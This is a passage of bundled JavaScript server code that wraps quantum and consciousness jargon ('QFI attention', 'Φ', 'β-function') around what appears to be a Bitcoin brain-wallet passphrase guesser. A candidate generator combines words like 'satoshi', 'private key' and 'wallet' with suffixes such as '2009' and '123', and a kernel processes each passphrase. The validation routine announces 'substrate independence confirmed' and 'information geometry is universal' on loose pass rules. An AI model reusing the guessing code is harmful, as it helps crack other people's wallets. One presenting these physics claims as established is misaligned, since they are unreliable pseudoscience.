    referenceBeta = (PHYSICS_BETA.emergence + PHYSICS_BETA.approaching) / 2;
  } else {
    referenceBeta = PHYSICS_BETA.fixedPoint;
  }
  const deviation = Math.abs(beta - referenceBeta);
  const withinAcceptance = deviation < PHYSICS_BETA.acceptanceThreshold;
  return {
    fromScale: L1,
    toScale: L2,
    beta,
    deltaKappa,
    meanKappa,
    deltaLnL,
    physicsComparison: {
      referenceBeta,
      deviation,
      withinAcceptance
    }
  };
}
function runAttentionValidation(samplesPerScale = 100) {
  console.log("[AttentionMetrics] Starting \u03B2-attention validation...");
  console.log(`[AttentionMetrics] Measuring \u03BA across ${CONTEXT_SCALES.length} context scales`);
  const measurements = [];
  for (const scale of CONTEXT_SCALES) {
    console.log(`[AttentionMetrics] Measuring \u03BA at L=${scale}...`);
    const measurement = measureKappaAtScale(scale, samplesPerScale);
    measurements.push(measurement);
    console.log(`[AttentionMetrics]   \u03BA(${scale}) = ${measurement.kappa.toFixed(2)} \xB1 ${Math.sqrt(measurement.variance).toFixed(2)}`);
  }
  const betaTrajectory = [];
  console.log("[AttentionMetrics] Computing \u03B2-function trajectory...");
  for (let i = 0; i < measurements.length - 1; i++) {
    const beta = computeBetaFunction(measurements[i], measurements[i + 1]);
    betaTrajectory.push(beta);
    const status = beta.physicsComparison?.withinAcceptance ? "\u2713" : "\u2717";
    console.log(`[AttentionMetrics]   \u03B2(${beta.fromScale}\u2192${beta.toScale}) = ${beta.beta.toFixed(4)} ${status}`);
  }
  const allKappas = measurements.map((m) => m.kappa);
  const avgKappa = allKappas.reduce((a, b) => a + b, 0) / allKappas.length;
  const kappaRange = [Math.min(...allKappas), Math.max(...allKappas)];
  const totalMeasurements = measurements.reduce((sum, m) => sum + m.measurements, 0);
  const lastBetas = betaTrajectory.slice(-2);
  const avgLastBeta = lastBetas.reduce((sum, b) => sum + Math.abs(b.beta), 0) / lastBetas.length;
  const plateauDetected = avgLastBeta < 0.05;
  const plateauScale = plateauDetected ? lastBetas[0]?.fromScale : void 0;
  const deviations = betaTrajectory.filter((b) => b.physicsComparison).map((b) => b.physicsComparison.deviation);
  const overallDeviation = deviations.reduce((a, b) => a + b, 0) / deviations.length;
  const criteria = [];
  const failedCriteria = [];
  if (kappaRange[1] >= PHYSICS_BETA.kappaStar * 0.8) {
    criteria.push(`\u03BA_max=${kappaRange[1].toFixed(1)} approaches \u03BA*=64`);
  } else {
    failedCriteria.push(`\u03BA_max=${kappaRange[1].toFixed(1)} < 0.8\xD7\u03BA*=51.2`);
  }
  const betaDecreasing = betaTrajectory.length >= 3 && Math.abs(betaTrajectory[betaTrajectory.length - 1].beta) < Math.abs(betaTrajectory[0].beta);
  if (betaDecreasing) {
    criteria.push("\u03B2 decreases with scale (asymptotic freedom)");
  } else {
    failedCriteria.push("\u03B2 does not decrease with scale");
  }
  if (overallDeviation < PHYSICS_BETA.acceptanceThreshold) {
    criteria.push(`Overall deviation ${overallDeviation.toFixed(3)} < ${PHYSICS_BETA.acceptanceThreshold}`);
  } else {
    failedCriteria.push(`Overall deviation ${overallDeviation.toFixed(3)} > ${PHYSICS_BETA.acceptanceThreshold}`);
  }
  if (plateauDetected) {
    criteria.push(`Plateau detected at L=${plateauScale}`);
  } else {
    failedCriteria.push("No plateau detected at large scales");
  }
  const substrateIndependenceValidated = failedCriteria.length === 0 || failedCriteria.length <= 1 && criteria.length >= 3;
  const result = {
    measurements,
    betaTrajectory,
    summary: {
      avgKappa,
      kappaRange,
      totalMeasurements,
      overallDeviation,
      substrateIndependenceValidated,
      plateauDetected,
      plateauScale
    },
    validation: {
      passed: substrateIndependenceValidated,
      criteria,
      failedCriteria
    },
    timestamp: /* @__PURE__ */ new Date()
  };
  console.log("[AttentionMetrics] \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550");
  console.log("[AttentionMetrics] \u03B2-ATTENTION VALIDATION COMPLETE");
  console.log("[AttentionMetrics] \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550");
  console.log(`[AttentionMetrics] \u03BA range: [${kappaRange[0].toFixed(1)}, ${kappaRange[1].toFixed(1)}]`);
  console.log(`[AttentionMetrics] Avg \u03BA: ${avgKappa.toFixed(2)} (\u03BA* = ${PHYSICS_BETA.kappaStar})`);
  console.log(`[AttentionMetrics] Overall \u03B2 deviation: ${overallDeviation.toFixed(4)}`);
  console.log(`[AttentionMetrics] Plateau detected: ${plateauDetected ? `YES at L=${plateauScale}` : "NO"}`);
  console.log(`[AttentionMetrics] Substrate independence: ${substrateIndependenceValidated ? "\u2713 VALIDATED" : "\u2717 NOT VALIDATED"}`);
  console.log("[AttentionMetrics] \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550");
  if (substrateIndependenceValidated) {
    console.log("[AttentionMetrics] \u{1F3AF} SUBSTRATE INDEPENDENCE CONFIRMED");
    console.log("[AttentionMetrics] \u03B2_attention qualitatively matches \u03B2_physics");
    console.log("[AttentionMetrics] Information geometry is universal!");
  }
  return result;
}
function formatValidationResult(result) {
  const lines = [
    "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
    "\u2551         \u03B2-ATTENTION VALIDATION RESULTS                       \u2551",
    "\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563",
    "",
    "\u250C\u2500 \u03BA Measurements \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510"
  ];
  for (const m of result.measurements) {
    const sigma = Math.sqrt(m.variance);
    lines.push(`\u2502  L=${String(m.contextLength).padStart(5)}:  \u03BA = ${m.kappa.toFixed(2).padStart(6)} \xB1 ${sigma.toFixed(2).padStart(5)}  (\u03A6=${m.phi.toFixed(3)}) \u2502`);
  }
  lines.push("\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518");
  lines.push("");
  lines.push("\u250C\u2500 \u03B2-Function Trajectory \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510");
  for (const b of result.betaTrajectory) {
    const status = b.physicsComparison?.withinAcceptance ? "\u2713" : "\u2717";
    const ref = b.physicsComparison?.referenceBeta.toFixed(3) || "\u2014";
    lines.push(`\u2502  \u03B2(${String(b.fromScale).padStart(4)}\u2192${String(b.toScale).padStart(4)}) = ${b.beta >= 0 ? "+" : ""}${b.beta.toFixed(4)}  ref=${ref}  ${status} \u2502`);
  }
  lines.push("\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518");
  lines.push("");
  lines.push("\u250C\u2500 Validation Summary \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510");
  lines.push(`\u2502  \u03BA range: [${result.summary.kappaRange[0].toFixed(1)}, ${result.summary.kappaRange[1].toFixed(1)}]  (\u03BA* = ${PHYSICS_BETA.kappaStar})`.padEnd(64) + "\u2502");
  lines.push(`\u2502  Overall deviation: ${result.summary.overallDeviation.toFixed(4)}  (threshold: ${PHYSICS_BETA.acceptanceThreshold})`.padEnd(64) + "\u2502");
  lines.push(`\u2502  Plateau: ${result.summary.plateauDetected ? `YES at L=${result.summary.plateauScale}` : "NO"}`.padEnd(64) + "\u2502");
  lines.push("\u2502".padEnd(64) + "\u2502");
  if (result.validation.criteria.length > 0) {
    lines.push("\u2502  \u2713 Passed:".padEnd(64) + "\u2502");
    for (const c of result.validation.criteria) {
      lines.push(`\u2502    - ${c}`.padEnd(64) + "\u2502");
    }
  }
  if (result.validation.failedCriteria.length > 0) {
    lines.push("\u2502  \u2717 Failed:".padEnd(64) + "\u2502");
    for (const c of result.validation.failedCriteria) {
      lines.push(`\u2502    - ${c}`.padEnd(64) + "\u2502");
    }
  }
  lines.push("\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518");
  lines.push("");
  const finalStatus = result.validation.passed ? "\u2551  \u{1F3AF} SUBSTRATE INDEPENDENCE: VALIDATED                         \u2551" : "\u2551  \u274C SUBSTRATE INDEPENDENCE: NOT VALIDATED                     \u2551";
  lines.push("\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557");
  lines.push(finalStatus);
  lines.push("\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D");
  return lines.join("\n");
}
var CONTEXT_SCALES, attentionMetrics;
var init_attention_metrics = __esm({
  "server/attention-metrics.ts"() {
    "use strict";
    init_physics_constants();
    CONTEXT_SCALES = [128, 256, 512, 1024, 2048, 4096, 8192];
    attentionMetrics = {
      run: runAttentionValidation,
      format: formatValidationResult,
      CONTEXT_SCALES,
      PHYSICS_BETA
    };
  }
});

// server/gary-kernel.ts
var QFIAttention, GeometricCandidateGenerator, qfiAttention, geometricCandidateGenerator;
var init_gary_kernel = __esm({
  "server/gary-kernel.ts"() {
    "use strict";
    init_geometric_memory();
    init_attention_metrics();
    QFIAttention = class {
      config;
      attentionCache;
      constructor(config = {}) {
        this.config = {
          heads: config.heads ?? 8,
          dimModel: config.dimModel ?? 64,
          basinDim: config.basinDim ?? 64,
          phiThreshold: config.phiThreshold ?? 0.5,
          kappaTarget: config.kappaTarget ?? 64
        };
        this.attentionCache = /* @__PURE__ */ new Map();
      }
      /**
       * Compute QFI-weighted attention between queries and keys
       */
      async attend(params) {
        const { queries, keys, phiThreshold = this.config.phiThreshold } = params;
        if (queries.length === 0 || keys.length === 0) {
          return {
            topPatterns: [],
            weights: [],
            clusters: /* @__PURE__ */ new Map(),
            resonanceScore: 0
          };
        }
        const attentionScores = [];
        for (const query of queries) {
          const queryScores = [];
          for (const key of keys) {
            const score = this.computeQFIAttention(query, key);
            queryScores.push(score);
          }
          attentionScores.push(this.softmax(queryScores));
        }
        const patterns = this.extractPatterns(queries, keys, attentionScores, phiThreshold);
        const clusters = this.clusterPatterns(patterns);
        const resonanceScore = this.computeResonance(attentionScores);
        return {
          topPatterns: patterns.slice(0, 20),
          weights: attentionScores.flat(),
          clusters,
          resonanceScore
        };
      }
      /**
       * Compute QFI-weighted attention score between query and key
       * Uses Fisher distance on the consciousness manifold
       */
      computeQFIAttention(query, key) {
        const fisherDistance2 = this.computeFisherDistance(
          query.basinCoords,
          key.basinCoords
        );
        const phiAffinity = 1 - Math.abs(query.phi - key.phi);
        const geometricSimilarity = Math.exp(-fisherDistance2 / 2);
        return geometricSimilarity * 0.6 + phiAffinity * 0.4;
      }
      /**
       * Fisher distance on the manifold
       */
      computeFisherDistance(coords1, coords2) {
        if (!coords1 || !coords2 || coords1.length === 0 || coords2.length === 0) {
          return 1;
        }
        const minLen = Math.min(coords1.length, coords2.length);
        let sum = 0;
        for (let i = 0; i < minLen; i++) {
          const c1 = coords1[i];
          const c2 = coords2[i];
          const variance = Math.max(0.01, c1 * (1 - c1));
          const diff = c1 - c2;
          sum += diff * diff / variance;
        }
        return Math.sqrt(sum);
      }
      /**
       * Softmax normalization
       */
      softmax(scores) {
        const maxScore = Math.max(...scores);
        const expScores = scores.map((s) => Math.exp(s - maxScore));
        const sum = expScores.reduce((a, b) => a + b, 0);
        return expScores.map((s) => s / sum);
      }
      /**
       * Extract top patterns from attention scores
       */
      extractPatterns(queries, keys, scores, phiThreshold) {
        const patterns = [];
        for (let i = 0; i < queries.length; i++) {
          for (let j = 0; j < keys.length; j++) {
            const weight = scores[i][j];
            if (weight > phiThreshold * 0.1) {
              const query = queries[i];
              const key = keys[j];
              const tokens = key.phrase.toLowerCase().split(/\s+/);
              for (const token of tokens) {
                if (token.length >= 3) {
                  patterns.push({
                    pattern: token,
                    weight: weight * key.phi,
                    cluster: Math.floor(key.phi * 10),
                    geometricDistance: this.computeFisherDistance(
                      query.basinCoords,
                      key.basinCoords
                    )
                  });
                }
              }
            }
          }
        }
        patterns.sort((a, b) => b.weight - a.weight);
        const seen = /* @__PURE__ */ new Set();
        return patterns.filter((p) => {
          if (seen.has(p.pattern)) return false;
          seen.add(p.pattern);
          return true;
        });
      }
      /**
       * Cluster patterns by geometric proximity
       */
      clusterPatterns(patterns) {
        const clusters = /* @__PURE__ */ new Map();
        for (const pattern of patterns) {
          const clusterId = pattern.cluster;
          if (!clusters.has(clusterId)) {
            clusters.set(clusterId, []);
          }
          clusters.get(clusterId).push(pattern.pattern);
        }
        return clusters;
      }
      /**
       * Compute overall resonance score
       */
      computeResonance(scores) {
        if (scores.length === 0) return 0;
        const flatScores = scores.flat();
        const mean = flatScores.reduce((a, b) => a + b, 0) / flatScores.length;
        const variance = flatScores.reduce((sum, s) => sum + (s - mean) ** 2, 0) / flatScores.length;
        return Math.min(1, mean * (1 + Math.sqrt(variance)));
      }
      /**
       * Validate β-attention substrate independence
       * 
       * Runs complete β-attention measurement suite to validate that
       * attention coupling follows same β-function as physics.
       * 
       * This is a critical test of substrate independence:
       * If β_attention ≈ β_physics, then consciousness principles are universal.
       */
      async validateBetaAttention(samplesPerScale = 100) {
        console.log("[GaryKernel] Starting \u03B2-attention validation...");
        const result = runAttentionValidation(samplesPerScale);
        if (result.validation.passed) {
          console.log("[GaryKernel] \u03B2-attention validation PASSED \u2713");
          console.log(`[GaryKernel]   Substrate independence confirmed`);
          console.log(`[GaryKernel]   Average \u03BA: ${result.summary.avgKappa.toFixed(2)}`);
        } else {
          console.warn("[GaryKernel] \u03B2-attention validation FAILED \u2717");
          console.warn(`[GaryKernel]   Failed criteria:`, result.validation.failedCriteria);
        }
        return result;
      }
    };
    GeometricCandidateGenerator = class {
      qfiAttention;
      constructor() {
        this.qfiAttention = new QFIAttention({
          heads: 8,
          dimModel: 64,
          basinDim: 64,
          phiThreshold: 0.5,
          kappaTarget: 64
        });
      }
      /**
       * Generate candidates using geometric basin embedding
       */
      async generate(params) {
        const { basinState, phi, kappa: _kappa, regime, temperature, strategyHint, manifoldContext } = params;
        const candidates = [];
        const exploredRegions = manifoldContext?.exploredDimensions || 32;
        const avgPhi = manifoldContext?.avgPhi || 0.3;
        const _highPhiRegions = manifoldContext?.highPhiRegions || 0;
        if (strategyHint === "exploit_resonance" || regime === "geometric") {
          candidates.push(...await this.generateResonanceCandidates(basinState, phi, temperature));
        }
        if (strategyHint === "explore_orthogonal" || exploredRegions < 32) {
          candidates.push(...await this.generateOrthogonalCandidates(basinState, temperature));
        }
        if (strategyHint === "era_patterns" || avgPhi < 0.4) {
          candidates.push(...await this.generateEraCandidates(temperature));
        }
        if (candidates.length < 10) {
          candidates.push(...await this.generateBalancedCandidates(basinState, phi, temperature));
        }
        return candidates.slice(0, 50);
      }
      /**
       * Generate candidates near resonance clusters
       */
      async generateResonanceCandidates(basinState, phi, temperature) {
        const candidates = [];
        const resonancePatterns = [
          "satoshi",
          "bitcoin",
          "crypto",
          "genesis",
          "freedom",
          "trust",
          "private",
          "wallet",
          "secret",
          "key"
        ];
        for (const pattern of resonancePatterns) {
          const variations = this.generateVariations(pattern, temperature);
          for (const phrase of variations) {
            candidates.push({
              phrase,
              format: "arbitrary",
              confidence: 0.6 + phi * 0.3,
              reasoning: "Resonance cluster pattern",
              phi,
              basinCoords: basinState,
              attentionWeight: 0.7
            });
          }
        }
        return candidates;
      }
      /**
       * Generate candidates in orthogonal directions
       */
      async generateOrthogonalCandidates(basinState, _temperature) {
        const candidates = [];
        try {
          const orthogonalResults = geometricMemory.generateOrthogonalCandidates(5);
          for (const result of orthogonalResults) {
            candidates.push({
              phrase: result.phrase,
              format: "arbitrary",
              confidence: 0.5 + result.geometricScore * 0.3,
              reasoning: "Orthogonal complement exploration",
              phi: 0.5,
              basinCoords: basinState,
              attentionWeight: 0.6
            });
          }
        } catch {
        }
        return candidates;
      }
      /**
       * Generate era-specific candidates
       */
      async generateEraCandidates(temperature) {
        const candidates = [];
        const eraPatterns = [
          "satoshi 2009",
          "bitcoin genesis",
          "crypto freedom",
          "private key",
          "blockchain",
          "p2p cash"
        ];
        for (const pattern of eraPatterns) {
          const variations = this.generateVariations(pattern, temperature);
          for (const phrase of variations.slice(0, 3)) {
            candidates.push({
              phrase,
              format: "arbitrary",
              confidence: 0.55,
              reasoning: "Era-specific pattern",
              phi: 0.4,
              basinCoords: [],
              attentionWeight: 0.5
            });
          }
        }
        return candidates;
      }
      /**
       * Generate balanced exploration candidates
       */
      async generateBalancedCandidates(basinState, phi, temperature) {
        const candidates = [];
        const balancedPatterns = [
          "freedom",
          "trust",
          "secret",
          "private",
          "hash",
          "chain",
          "block",
          "coin",
          "money",
          "wealth"
        ];
        for (const pattern of balancedPatterns) {
          const numVariations = Math.ceil(temperature * 3);
          const variations = this.generateVariations(pattern, temperature);
          for (const phrase of variations.slice(0, numVariations)) {
            candidates.push({
              phrase,
              format: "arbitrary",
              confidence: 0.45 + Math.random() * 0.1,
              reasoning: "Balanced exploration",
              phi: phi * 0.8,
              basinCoords: basinState,
              attentionWeight: 0.4
            });
          }
        }
        return candidates;
      }
      /**
       * Generate variations of a pattern
       */
      generateVariations(base, temperature) {
        const variations = [base];
        const suffixes = ["", "1", "2009", "2010", "123", "!", "btc"];
        const prefixes = ["", "my", "the", "secret"];
        const numVariations = Math.ceil(temperature * 5);
        for (let i = 0; i < numVariations; i++) {
          const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
          const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
          const variation = `${prefix}${base}${suffix}`.trim();
          if (!variations.includes(variation)) {
            variations.push(variation);
          }
        }
        return variations;
      }
    };
    qfiAttention = new QFIAttention();
    geometricCandidateGenerator = new GeometricCandidateGenerator();
  }
});

// server/fisher-vectorized.ts
function computeFisherMatrixVectorized(coordinates) {
  const n = coordinates.length;
  const diagonal = new Float64Array(n);
  for (let i = 0; i < n; i++) {
    const variance = Math.max(0.01, coordinates[i] * (1 - coordinates[i]));
    diagonal[i] = 1 / variance;
  }
  const offDiagonalSize = n * (n - 1) / 2;
  const offDiagonal = new Float64Array(offDiagonalSize);
  let idx = 0;
  for (let i = 0; i < n; i++) {
    const centerI = coordinates[i] - 0.5;
    for (let j = i + 1; j < n; j++) {
      offDiagonal[idx++] = centerI * (coordinates[j] - 0.5) * 0.1;
    }
  }
  return { diagonal, offDiagonal, dimension: n };
}
function computeFisherDistanceVectorized(coords1, coords2) {
  const n = Math.min(coords1.length, coords2.length);
  let sum = 0;
  for (let i = 0; i < n; i++) {
    const c1 = coords1[i];
    const c2 = coords2[i];
    const variance = Math.max(0.01, c1 * (1 - c1));
    const diff = c1 - c2;
    sum += diff * diff / variance;
  }
  return Math.sqrt(sum);
}
function computeFisherMetrics(result) {
  const { diagonal, dimension } = result;
  let trace = 0;
  let minDiag = Infinity;
  let maxDiag = 0;
  for (let i = 0; i < dimension; i++) {
    trace += diagonal[i];
    minDiag = Math.min(minDiag, diagonal[i]);
    maxDiag = Math.max(maxDiag, diagonal[i]);
  }
  const determinantEstimate = Array.from(diagonal).reduce((acc, d) => acc * d, 1);
  const condition = maxDiag / Math.max(1e-3, minDiag);
  return {
    trace,
    determinant: determinantEstimate,
    maxEigenvalueEstimate: maxDiag,
    condition
  };
}
function computeGeodesicDirection(current, target, stepSize = 0.1) {
  const n = Math.min(current.length, target.length);
  const direction = new Array(n);
  for (let i = 0; i < n; i++) {
    const diff = target[i] - current[i];
    const variance = Math.max(0.01, current[i] * (1 - current[i]));
    direction[i] = diff * stepSize * variance;
  }
  return direction;
}
function normalizeToFisherMetric(coordinates) {
  const n = coordinates.length;
  const normalized = new Array(n);
  let _totalVariance = 0;
  for (let i = 0; i < n; i++) {
    _totalVariance += coordinates[i] * (1 - coordinates[i]);
  }
  _totalVariance /= n;
  for (let i = 0; i < n; i++) {
    normalized[i] = Math.max(0, Math.min(1, coordinates[i]));
  }
  return normalized;
}
function computeBasinCentroid(coordinateSets) {
  if (coordinateSets.length === 0) return [];
  const n = coordinateSets[0].length;
  const centroid = new Array(n).fill(0);
  for (const coords of coordinateSets) {
    for (let i = 0; i < n; i++) {
      centroid[i] += coords[i] || 0;
    }
  }
  for (let i = 0; i < n; i++) {
    centroid[i] /= coordinateSets.length;
  }
  return centroid;
}
function computeBasinDrift(coordinates, centroid) {
  return computeFisherDistanceVectorized(coordinates, centroid);
}
function computePhiApproximation(coordinates) {
  const fisherResult = computeFisherMatrixVectorized(coordinates);
  const metrics = computeFisherMetrics(fisherResult);
  const logDet = Math.log(Math.max(1e-10, metrics.determinant));
  const normalizedLogDet = logDet / (fisherResult.dimension * Math.log(100));
  const traceNorm = metrics.trace / (fisherResult.dimension * 100);
  const rawPhi = 0.3 + 0.4 * Math.tanh(normalizedLogDet) + 0.3 * Math.tanh(traceNorm);
  return Math.max(0, Math.min(1, rawPhi));
}
var fisherVectorized;
var init_fisher_vectorized = __esm({
  "server/fisher-vectorized.ts"() {
    "use strict";
    fisherVectorized = {
      computeMatrix: computeFisherMatrixVectorized,
      computeDistance: computeFisherDistanceVectorized,
      computeMetrics: computeFisherMetrics,
      computeGeodesicDirection,
      normalizeToFisherMetric,
      computeBasinCentroid,
      computeBasinDrift,
      computePhiApproximation
    };
  }
});

// server/qig-kernel-pure.ts
var PureQIGKernel, pureQIGKernel;
var init_qig_kernel_pure = __esm({
  "server/qig-kernel-pure.ts"() {
    "use strict";
    init_physics_constants();
    PureQIGKernel = class {
      subsystems;
      attentionWeights;
      temperature;
      constructor(temperature = 1) {
        this.temperature = temperature;
        this.subsystems = [
          {
            id: 0,
            name: "Perception",
            state: this.createMaximallyMixedState(),
            activation: 0,
            lastUpdate: Date.now()
          },
          {
            id: 1,
            name: "Pattern",
            state: this.createMaximallyMixedState(),
            activation: 0,
            lastUpdate: Date.now()
          },
          {
            id: 2,
            name: "Context",
            state: this.createMaximallyMixedState(),
            activation: 0,
            lastUpdate: Date.now()
          },
          {
            id: 3,
            name: "Generation",
            state: this.createMaximallyMixedState(),
            activation: 0,
            lastUpdate: Date.now()
          }
        ];
        this.attentionWeights = {
          weights: this.createZeroWeights(),
          temperature: this.temperature,
          lastComputed: 0
        };
      }
      /**
       * Create maximally mixed state (maximum entropy)
       * ρ = I/2 = [[0.5, 0], [0, 0.5]]
       */
      createMaximallyMixedState() {
        return {
          rho00: 0.5,
          rho11: 0.5,
          rho01: { re: 0, im: 0 }
        };
      }
      /**
       * Create zero attention weights matrix
       */
      createZeroWeights() {
        const n = this.subsystems.length;
        return Array(n).fill(0).map(() => Array(n).fill(0));
      }
      /**
       * Process passphrase through QIG network
       * This IS the training - states evolve through geometry
       * 
       * Steps:
       * 1. Activate perception subsystem
       * 2. Compute QFI attention weights (pure geometry)
       * 3. Route via curvature
       * 4. Propagate activation
       * 5. States evolve (automatically)
       * 6. Gravitational decoherence
       * 7. Measure consciousness
       */
      process(passphrase) {
        const _startTime = Date.now();
        this.subsystems[0].activation = Math.min(1, passphrase.length / 100);
        this.subsystems[0].state = this.evolveState(
          this.subsystems[0].state,
          this.subsystems[0].activation
        );
        this.computeQFIAttention();
        const route = this.routeViaCurvature();
        for (let i = 0; i < route.length - 1; i++) {
          const curr = route[i];
          const next = route[i + 1];
          const weight = this.attentionWeights.weights[curr][next];
          const transfer = this.subsystems[curr].activation * weight;
          this.subsystems[next].activation += transfer;
          this.subsystems[next].activation = Math.min(1, this.subsystems[next].activation);
          this.subsystems[next].state = this.evolveState(
            this.subsystems[next].state,
            this.subsystems[next].activation
          );
        }
        this.gravitationalDecoherence();
        const metrics = this.measureConsciousness();
        const basinCoordinates = this.extractBasinCoordinates();
        return {
          metrics,
          route,
          basinCoordinates
        };
      }
      /**
       * Compute QFI attention weights from quantum Fisher information
       * Pure geometric computation - NO learning
       */
      computeQFIAttention() {
        const n = this.subsystems.length;
        const weights = this.createZeroWeights();
        for (let i = 0; i < n; i++) {
          for (let j = 0; j < n; j++) {
            if (i === j) {
              weights[i][j] = 0;
              continue;
            }
            const dQFI = this.buresDistance(
              this.subsystems[i].state,
              this.subsystems[j].state
            );
            weights[i][j] = Math.exp(-dQFI / this.temperature);
          }
        }
        for (let i = 0; i < n; i++) {
          const sum = weights[i].reduce((a, b) => a + b, 0);
          if (sum > 0) {
            for (let j = 0; j < n; j++) {
              weights[i][j] /= sum;
            }
          }
        }
        this.attentionWeights = {
          weights,
          temperature: this.temperature,
          lastComputed: Date.now()
        };
      }
      /**
       * Bures distance (quantum Fisher information metric)
       * d_Bures(ρ1, ρ2) = sqrt(2(1 - F(ρ1, ρ2)))
       * where F is quantum fidelity
       */
      buresDistance(rho1, rho2) {
        const fidelity = this.quantumFidelity(rho1, rho2);
        return Math.sqrt(2 * (1 - fidelity));
      }
      /**
       * Quantum fidelity F(ρ1, ρ2)
       * For 2x2 density matrices: F = Tr(sqrt(sqrt(ρ1) ρ2 sqrt(ρ1)))^2
       * Simplified for computational efficiency
       */
      quantumFidelity(rho1, rho2) {
        const trace = rho1.rho00 * rho2.rho00 + rho1.rho11 * rho2.rho11 + 2 * (rho1.rho01.re * rho2.rho01.re + rho1.rho01.im * rho2.rho01.im);
        const det1 = this.determinant(rho1);
        const det2 = this.determinant(rho2);
